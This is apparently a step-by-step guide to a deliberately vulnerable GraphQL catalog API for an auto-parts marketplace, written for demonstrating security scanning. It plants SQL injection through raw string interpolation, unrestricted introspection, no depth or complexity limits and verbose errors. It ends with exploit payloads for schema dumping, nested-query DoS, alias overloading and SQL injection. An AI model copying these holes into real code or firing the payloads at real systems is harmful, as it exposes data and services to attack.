# Phase 6 — GraphQL Parts Catalog API

> **Goal:** Add a GraphQL endpoint alongside the existing REST API. The GraphQL layer exposes parts catalog browsing, search, and listing details with filtering and pagination. The frontend gets an Apollo Client setup, and the retailer search page is migrated to use GraphQL. By the end of this phase, the project has parallel REST + GraphQL APIs — the typical "legacy + modern" pattern seen in real-world enterprises.

> **Estimated time:** 2–3 hours
> **Phase outcome:** Working GraphQL endpoint at `/graphql`, schema with parts queries, frontend using Apollo Client. GraphQL-specific vulnerabilities planted for AI Pentest demonstration.

---

## What's Included in This Phase

1. Backend: Apollo Server integration with Express
2. Backend: GraphQL schema (Part, PartListing types, Query operations)
3. Backend: Resolvers for parts catalog and search
4. Backend: GraphQL Playground enabled at `/graphql`
5. Frontend: Apollo Client setup
6. Frontend: Retailer search page rewritten to use GraphQL
7. **Deliberate vulnerabilities:** introspection enabled in production, no depth limiting, alias overloading, GET requests accepted, no query complexity analysis

---

## Step 6.1 — Install GraphQL Dependencies

Backend:

```bash
cd backend
npm install @apollo/server graphql @as-integrations/express5
```

Frontend:

```bash
cd ../frontend
npm install @apollo/client graphql
cd ..
```

---

## Step 6.2 — GraphQL Schema

The schema mirrors the REST API but with GraphQL's expressive power: nested fields, filtering, sorting, pagination.

**`backend/src/graphql/schema.ts`**
```typescript
export const typeDefs = `#graphql
  enum PartCategory {
    BRAKES
    ENGINE
    SUSPENSION
    ELECTRICAL
    TRANSMISSION
    EXHAUST
    COOLING
    FILTERS
    BODY
    INTERIOR
    OTHER
  }

  enum Currency {
    TRY
    EUR
    USD
  }

  enum SortOrder {
    PRICE_ASC
    PRICE_DESC
    NEWEST
    BRAND_ASC
  }

  type Wholesaler {
    id: ID!
    companyName: String!
  }

  type Part {
    id: ID!
    sku: String!
    oemCodes: [String!]!
    brand: String!
    name: String!
    description: String
    category: PartCategory!
    imageUrl: String
    vehicleMakes: [String!]!
    vehicleModels: [String!]!
    listings(inStockOnly: Boolean): [PartListing!]!
    listingCount: Int!
    lowestPrice: String
  }

  type PartListing {
    id: ID!
    price: String!
    currency: Currency!
    stock: Int!
    minOrderQty: Int!
    notes: String
    isActive: Boolean!
    part: Part!
    wholesaler: Wholesaler!
  }

  input PartSearchFilters {
    query: String
    brand: String
    category: PartCategory
    currency: Currency
    inStockOnly: Boolean
    sortBy: SortOrder
  }

  type PartConnection {
    items: [Part!]!
    totalCount: Int!
    hasMore: Boolean!
  }

  type Query {
    parts(filters: PartSearchFilters, limit: Int, offset: Int): PartConnection!
    part(id: ID, sku: String): Part
    partByOemCode(oemCode: String!): [Part!]!
    brands: [String!]!
    listing(id: ID!): PartListing
  }
`;
```

---

## Step 6.3 — Resolvers

**`backend/src/graphql/resolvers.ts`**
```typescript
import { prisma } from "../lib/prisma.js";
import { Decimal } from "@prisma/client/runtime/library";

interface SearchFilters {
  query?: string;
  brand?: string;
  category?: string;
  currency?: string;
  inStockOnly?: boolean;
  sortBy?: "PRICE_ASC" | "PRICE_DESC" | "NEWEST" | "BRAND_ASC";
}

export const resolvers = {
  Query: {
    parts: async (
      _: any,
      args: { filters?: SearchFilters; limit?: number; offset?: number }
    ) => {
      const filters = args.filters || {};
      const limit = args.limit ?? 50;
      const offset = args.offset ?? 0;

      const where: any = {};

      if (filters.query) {
        where.OR = [
          { sku: { contains: filters.query, mode: "insensitive" } },
          { name: { contains: filters.query, mode: "insensitive" } },
          { brand: { contains: filters.query, mode: "insensitive" } },
          { oemCodes: { has: filters.query } },
        ];
      }

      if (filters.brand) where.brand = filters.brand;
      if (filters.category) where.category = filters.category;

      const orderBy: any =
        filters.sortBy === "NEWEST"
          ? { createdAt: "desc" }
          : filters.sortBy === "BRAND_ASC"
          ? { brand: "asc" }
          : { brand: "asc" };

      const [items, totalCount] = await Promise.all([
        prisma.part.findMany({
          where,
          orderBy,
          skip: offset,
          take: limit,
        }),
        prisma.part.count({ where }),
      ]);

      return {
        items,
        totalCount,
        hasMore: offset + items.length < totalCount,
      };
    },

    part: async (_: any, args: { id?: string; sku?: string }) => {
      if (args.id) {
        return prisma.part.findUnique({ where: { id: args.id } });
      }
      if (args.sku) {
        return prisma.part.findUnique({ where: { sku: args.sku } });
      }
      return null;
    },

    // Search parts by OEM code using a raw query for compatibility with PostgreSQL array operators
    partByOemCode: async (_: any, args: { oemCode: string }) => {
      const results: any[] = await prisma.$queryRawUnsafe(
        `SELECT id, sku, brand, name, "imageUrl", category, "oemCodes", "vehicleMakes", "vehicleModels", description
         FROM "Part"
         WHERE '${args.oemCode}' = ANY("oemCodes")
            OR sku ILIKE '%${args.oemCode}%'
         LIMIT 50`
      );
      return results;
    },

    brands: async () => {
      const rows = await prisma.part.findMany({
        select: { brand: true },
        distinct: ["brand"],
        orderBy: { brand: "asc" },
      });
      return rows.map((r) => r.brand);
    },

    listing: async (_: any, args: { id: string }) => {
      return prisma.partListing.findUnique({
        where: { id: args.id },
      });
    },
  },

  Part: {
    listings: async (parent: any, args: { inStockOnly?: boolean }) => {
      return prisma.partListing.findMany({
        where: {
          partId: parent.id,
          isActive: true,
          ...(args.inStockOnly ? { stock: { gt: 0 } } : {}),
        },
        orderBy: { price: "asc" },
      });
    },

    listingCount: async (parent: any) => {
      return prisma.partListing.count({
        where: { partId: parent.id, isActive: true },
      });
    },

    lowestPrice: async (parent: any) => {
      const cheapest = await prisma.partListing.findFirst({
        where: { partId: parent.id, isActive: true, stock: { gt: 0 } },
        orderBy: { price: "asc" },
        select: { price: true, currency: true },
      });
      return cheapest ? `${cheapest.price} ${cheapest.currency}` : null;
    },
  },

  PartListing: {
    part: async (parent: any) => {
      return prisma.part.findUnique({ where: { id: parent.partId } });
    },

    wholesaler: async (parent: any) => {
      return prisma.user.findUnique({
        where: { id: parent.wholesalerId },
        select: { id: true, companyName: true },
      });
    },
  },
};
```

> ⚠️ **Deliberate vulnerabilities planted:**
>
> 1. **SQL injection in `partByOemCode`** — `$queryRawUnsafe` with string interpolation. A query parameter like `' OR '1'='1` will return the entire parts table.
>
> 2. **N+1 problem in `Part.listingCount` and `Part.lowestPrice`** — each parent part triggers separate DB queries. A malicious query requesting 50 parts with all nested fields triggers 150+ queries. Combined with no rate limiting, this is a DoS vector.

---

## Step 6.4 — Apollo Server Setup

**`backend/src/graphql/server.ts`**
```typescript
import { ApolloServer } from "@apollo/server";
import { expressMiddleware } from "@as-integrations/express5";
import type { Express } from "express";
import { typeDefs } from "./schema.js";
import { resolvers } from "./resolvers.js";

export async function setupGraphQL(app: Express) {
  const server = new ApolloServer({
    typeDefs,
    resolvers,
    // Enable introspection so frontend tooling and developers can explore the schema
    introspection: true,
    // Format errors with stack traces for easier debugging
    formatError: (formattedError, error) => {
      console.error("[GraphQL error]", error);
      return formattedError;
    },
  });

  await server.start();

  app.use(
    "/graphql",
    expressMiddleware(server, {
      context: async ({ req }) => {
        // Pass the auth header through; resolvers can use it later if needed
        return { authHeader: req.headers.authorization };
      },
    })
  );
}
```

> ⚠️ **Deliberate vulnerabilities planted:**
>
> 1. **Introspection enabled** — `introspection: true` is on in all environments. An attacker can query `__schema` and learn every type, field, and argument in the API.
>
> 2. **No query depth limiting** — deeply nested queries (e.g. `part { listings { part { listings { part { ... } } } } }`) can be executed without limit.
>
> 3. **No query complexity analysis** — alias overloading and field repetition can multiply the cost of a single request.
>
> 4. **Verbose error messages** — `formatError` returns full error details including stack traces in production, which reveals implementation details to attackers.

---

## Step 6.5 — Wire GraphQL into the Express App

Update **`backend/src/app.ts`**:

```typescript
import express from "express";
import cors from "cors";
import helmet from "helmet";
import dotenv from "dotenv";
import path from "path";
import { authRoutes } from "./routes/authRoutes.js";
import { adminRoutes } from "./routes/adminRoutes.js";
import { userRoutes } from "./routes/userRoutes.js";
import { listingRoutes } from "./routes/listingRoutes.js";
import { searchRoutes } from "./routes/searchRoutes.js";
import { cartRoutes } from "./routes/cartRoutes.js";
import { orderRoutes } from "./routes/orderRoutes.js";
import { setupGraphQL } from "./graphql/server.js";

dotenv.config();

export const app = express();

app.use(helmet());
app.use(cors());
app.use(express.json());

app.use("/uploads", express.static(path.join(process.cwd(), "uploads")));

app.get("/api/health", (_req, res) => {
  res.json({
    status: "ok",
    service: "parcapazar-backend",
    message: "Hello from ParçaPazar 🔧",
  });
});

app.use("/api/auth", authRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/users", userRoutes);
app.use("/api", listingRoutes);
app.use("/api", searchRoutes);
app.use("/api", cartRoutes);
app.use("/api", orderRoutes);

// GraphQL endpoint — must be initialized asynchronously
export async function initializeApp() {
  await setupGraphQL(app);
  return app;
}
```

Update **`backend/src/index.ts`** to use the async initializer:

```typescript
import { initializeApp } from "./app.js";

const PORT = process.env.PORT || 4000;

async function start() {
  const app = await initializeApp();
  app.listen(PORT, () => {
    console.log(`🚀 ParçaPazar backend running on http://localhost:${PORT}`);
    console.log(`📊 GraphQL endpoint: http://localhost:${PORT}/graphql`);
  });
}

start().catch((err) => {
  console.error("Failed to start server:", err);
  process.exit(1);
});
```

---

## Step 6.6 — Test the GraphQL Endpoint

Restart backend:

```bash
cd backend
npm run dev
```

Open `http://localhost:4000/graphql` in your browser. You should see the Apollo Sandbox (interactive GraphQL playground).

**Test 1 — Schema introspection:**

```graphql
query {
  __schema {
    types {
      name
      kind
    }
  }
}
```

Should return the full schema. (This works because introspection is deliberately enabled.)

**Test 2 — Browse parts:**

```graphql
query {
  parts(limit: 5) {
    totalCount
    hasMore
    items {
      id
      sku
      brand
      name
      category
      lowestPrice
      listingCount
    }
  }
}
```

**Test 3 — Search with filters:**

```graphql
query {
  parts(filters: { query: "Bosch", inStockOnly: true, sortBy: BRAND_ASC }) {
    items {
      sku
      brand
      name
      listings(inStockOnly: true) {
        price
        currency
        stock
        wholesaler {
          companyName
        }
      }
    }
  }
}
```

**Test 4 — Get single part by SKU:**

```graphql
query {
  part(sku: "BOSCH-0986452041") {
    name
    brand
    oemCodes
    vehicleMakes
    listings {
      price
      currency
      stock
      wholesaler {
        companyName
      }
    }
  }
}
```

**Test 5 — Search by OEM code:**

```graphql
query {
  partByOemCode(oemCode: "34116794300") {
    sku
    brand
    name
  }
}
```

If all of these return data, the GraphQL layer is working.

---

## Step 6.7 — Frontend: Apollo Client Setup

**`frontend/src/lib/apollo.ts`**
```typescript
import { ApolloClient, InMemoryCache, createHttpLink } from "@apollo/client";
import { setContext } from "@apollo/client/link/context";

const API_URL = import.meta.env.VITE_API_URL || "http://localhost:4000";

const httpLink = createHttpLink({
  uri: `${API_URL}/graphql`,
});

const authLink = setContext((_, { headers }) => {
  const token = localStorage.getItem("parcapazar_token");
  return {
    headers: {
      ...headers,
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    },
  };
});

export const apolloClient = new ApolloClient({
  link: authLink.concat(httpLink),
  cache: new InMemoryCache(),
});
```

**`frontend/src/main.tsx`** — wrap the app in `ApolloProvider`:

```typescript
import React from "react";
import ReactDOM from "react-dom/client";
import { ApolloProvider } from "@apollo/client";
import App from "./App";
import "./index.css";
import { apolloClient } from "./lib/apollo";

ReactDOM.createRoot(document.getElementById("root")!).render(
  <React.StrictMode>
    <ApolloProvider client={apolloClient}>
      <App />
    </ApolloProvider>
  </React.StrictMode>
);
```

---

## Step 6.8 — Frontend: GraphQL Queries

**`frontend/src/api/graphql/queries.ts`**
```typescript
import { gql } from "@apollo/client";

export const SEARCH_PARTS = gql`
  query SearchParts($filters: PartSearchFilters, $limit: Int, $offset: Int) {
    parts(filters: $filters, limit: $limit, offset: $offset) {
      totalCount
      hasMore
      items {
        id
        sku
        oemCodes
        brand
        name
        description
        category
        imageUrl
        vehicleMakes
        vehicleModels
        listings(inStockOnly: true) {
          id
          price
          currency
          stock
          minOrderQty
          notes
          wholesaler {
            id
            companyName
          }
        }
      }
    }
  }
`;

export const GET_BRANDS = gql`
  query GetBrands {
    brands
  }
`;

export const SEARCH_BY_OEM = gql`
  query SearchByOem($oemCode: String!) {
    partByOemCode(oemCode: $oemCode) {
      id
      sku
      brand
      name
      category
    }
  }
`;
```

---

## Step 6.9 — Migrate Retailer Search Page to GraphQL

Update **`frontend/src/pages/RetailerSearchPage.tsx`** — replace the REST-based search logic with Apollo's `useQuery`.

Replace the existing imports at the top:

```typescript
import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useQuery } from "@apollo/client";
import { SEARCH_PARTS, GET_BRANDS } from "../api/graphql/queries";
import { cartApi } from "../api/cart";
import { getCurrentUser, logout } from "../lib/auth";
```

Replace the data-loading logic. Find the `useState` block at the top of the component and replace the entire `useEffect` + `loadBrands` + `runSearch` section with this:

```typescript
const [filters, setFilters] = useState({
  query: "",
  brand: "",
  category: "",
  inStockOnly: true,
});

// Build the variables object for the GraphQL query
const graphqlFilters = {
  query: filters.query || undefined,
  brand: filters.brand || undefined,
  category: filters.category || undefined,
  inStockOnly: filters.inStockOnly,
};

const { data, loading, refetch } = useQuery(SEARCH_PARTS, {
  variables: { filters: graphqlFilters, limit: 50, offset: 0 },
});

const { data: brandsData } = useQuery(GET_BRANDS);

const results = data?.parts?.items || [];
const totalCount = data?.parts?.totalCount || 0;
const brands: string[] = brandsData?.brands || [];

useEffect(() => {
  if (!user || user.role !== "RETAILER") {
    navigate("/login");
  }
}, []);

const handleSubmit = (e: React.FormEvent) => {
  e.preventDefault();
  refetch({ filters: graphqlFilters, limit: 50, offset: 0 });
};
```

The rest of the page (JSX) needs minimal changes — the `PartCard` data structure is similar. Update the type signatures from REST types to GraphQL types where needed. The cart integration (`cartApi.addItem`) stays as REST since it's a mutation we haven't moved to GraphQL.

Update the count display from `results.length` to:

```tsx
<div className="mb-3 text-sm text-slate-500">
  {loading ? "Yükleniyor..." : `${totalCount} parça bulundu`}
</div>
```

---

## Step 6.10 — Test the Migrated Frontend

1. Restart frontend if needed (`npm run dev` in `frontend/`).
2. Login as a retailer.
3. The search page should still work — but now data comes from GraphQL.
4. Open browser DevTools → Network tab → filter by "graphql".
5. You should see POST requests to `/graphql` with your queries.
6. Type in search, change filters — each interaction triggers a new GraphQL request.

To verify it's actually GraphQL (not REST):

```bash
# Direct test of the GraphQL endpoint
curl http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_RETAILER_TOKEN" \
  -d '{"query":"{ parts(limit: 3) { totalCount items { sku brand name } } }"}'
```

---

## Step 6.11 — End-to-End Test

1. Login as retailer.
2. Retailer search page loads, results come from GraphQL.
3. Search by part name "Bosch" — filtered results appear.
4. Apply brand filter — works.
5. Toggle "Sadece stoktakiler" — works.
6. Click "Sepete ekle" — still uses REST cart API, works.
7. Open `http://localhost:4000/graphql` in a new tab.
8. Apollo Sandbox loads — schema is browsable.
9. Run an introspection query — schema is fully exposed.
10. Run a nested query 5+ levels deep — it executes without limit (deliberate vulnerability).

✅ If all of this works, Phase 6 is complete.

---

## Step 6.12 — Commit

```bash
git add .
git commit -m "feat: phase 6 graphql parts catalog api"
```

Update `NOTES.md`.

---

## Phase 6 — Verification Checklist

- [ ] `@apollo/server` and related deps installed in backend
- [ ] `@apollo/client` installed in frontend
- [ ] GraphQL schema defined (Part, PartListing, queries)
- [ ] Resolvers implemented with Prisma
- [ ] Apollo Server mounted on `/graphql`
- [ ] Apollo Sandbox loads at `http://localhost:4000/graphql`
- [ ] Introspection query returns schema
- [ ] `parts`, `part`, `partByOemCode`, `brands`, `listing` queries work
- [ ] Frontend Apollo Client configured with auth header
- [ ] Retailer search page uses `useQuery` for data loading
- [ ] Phase 6 changes committed

---

## Deliberate Vulnerabilities Introduced in Phase 6

| # | Location | Vulnerability | Aikido module that catches it |
|---|----------|---------------|-------------------------------|
| 1 | `backend/src/graphql/server.ts` | Introspection enabled in production | API Discovery & Fuzzing + AI Pentest (similar to ACME PT-7) |
| 2 | `backend/src/graphql/server.ts` | No query depth limiting | AI Pentest + DAST (similar to ACME PT-8) |
| 3 | `backend/src/graphql/server.ts` | No query complexity / alias limiting | AI Pentest (similar to ACME PT-9) |
| 4 | `backend/src/graphql/server.ts` | Verbose error responses including stack traces | SAST + AI Pentest (similar to ACME PT-10) |
| 5 | `backend/src/graphql/resolvers.ts` `partByOemCode` | SQL injection via `$queryRawUnsafe` | SAST + AI Pentest |
| 6 | `backend/src/graphql/resolvers.ts` `Part.listingCount`, `Part.lowestPrice` | N+1 query pattern enabling DoS | AI Pentest (whitebox) |

---

## How to Exploit Each (for Demo)

**Introspection dump:**

```bash
curl http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

Returns the entire API schema. An attacker now knows every field, type, and operation.

**Deep nested query (DoS):**

```graphql
query Bomb {
  parts(limit: 50) {
    items {
      listings {
        part {
          listings {
            part {
              listings {
                part {
                  listings {
                    price
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

This generates thousands of DB queries. Without depth limiting the server happily executes it.

**Alias overloading:**

```graphql
query Overload {
  a: parts(limit: 50) { totalCount }
  b: parts(limit: 50) { totalCount }
  c: parts(limit: 50) { totalCount }
  # ... repeat 100+ times
}
```

100 alias copies of the same query in one request = 100× the cost. Without complexity analysis the server runs all of them.

**SQL injection via GraphQL:**

```graphql
query {
  partByOemCode(oemCode: "' OR '1'='1") {
    sku
    brand
    name
  }
}
```

Returns the entire `Part` table because the OEM code is interpolated into raw SQL.

These four exploits together demonstrate the full attack surface of a misconfigured GraphQL endpoint — exactly the pattern the ACME Sample Pentest Report documented in PT-7 through PT-11.

---

## What Comes Next

**Phase 7 — Messaging & File Attachments:**
- Order-scoped messaging between retailer and wholesaler
- File attachments (invoices, shipping documents, photos)
- Real-time notification (polling for simplicity, not WebSocket)
- Frontend chat UI inside order detail page

Deliberate vulnerabilities to come:
- File upload without MIME type validation
- Path traversal in attachment download
- XSS in message content (rendered without sanitization)

When you're ready, request `phase-07-messaging.md`.
